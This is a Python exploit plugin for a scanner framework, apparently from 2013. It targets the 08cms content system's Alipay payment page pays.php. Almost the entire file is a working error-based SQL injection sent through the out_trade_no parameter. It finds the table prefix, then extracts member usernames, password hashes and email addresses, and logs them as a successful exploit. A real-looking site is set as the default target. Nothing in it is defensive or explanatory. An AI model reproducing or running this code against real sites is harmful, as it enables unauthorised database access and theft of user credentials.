# -*- coding: utf-8 -*-
class mstplugin:
    infos = [
        ['Plugin','08cms_pays.php_SQLInject'],
        ['Author','Mr.x'],
        ['Update','2013/11/6'],
        ['site','http://hi.baidu.com/seo0775']
        ]
    opts  = [
        ['URL','www.8chd.com','Url'],
        ['PATH','/','Cms path'],
        ['PORT','80','port']
        ]
    def exploit(self):
        url = fuck.urlformate(URL,PORT,PATH)
#        self.get_tables(url)
        exp_name = url+"/include/paygate/alipay/pays.php?out_trade_no=22'%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20concat(0x3a,mname,0x3a,password,0x3a,email,0x3a)%20from%20cms_members%20limit%201,1),FLOOR(RAND(0)*2))X%20FROM%20information_schema.tables%20GROUP%20BY%20X)a)%20AND'"
#        color.cprint("[*] Inject ..",YELLOW)
        ok  = fuck.urlget(exp_name)
    	tables=fuck.find("\w+_pays",ok.read())
#    	print tables[0]
    	tables=fuck.find("(^.*)_",tables[0])
    	print tables[0] #这里得到表前缀
    	exp_name = url+"/include/paygate/alipay/pays.php?out_trade_no=22'%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20concat(0x3a,mname,0x3d,password,0x3a,email,0x3a)%20from%20"+tables[0]+"_members%20limit%201,1),FLOOR(RAND(0)*2))X%20FROM%20information_schema.tables%20GROUP%20BY%20X)a)%20AND'"
    	ok  = fuck.urlget(exp_name)
        if ok.getcode() == 200:
            tmp=fuck.find("\w+=\w{32}",ok.read())
            if len(tmp)>0:
                color.cprint("[*] Exploit Successful !",GREEN)
                color.cprint('[*] '+tmp[0],GREEN)
                fuck.writelog("08cms_pays.php_SQLInject",URL+"::"+tmp[0])
            else:
                color.cprint("[!] TARGET NO VULNERABLE !",RED)
        else:
            color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
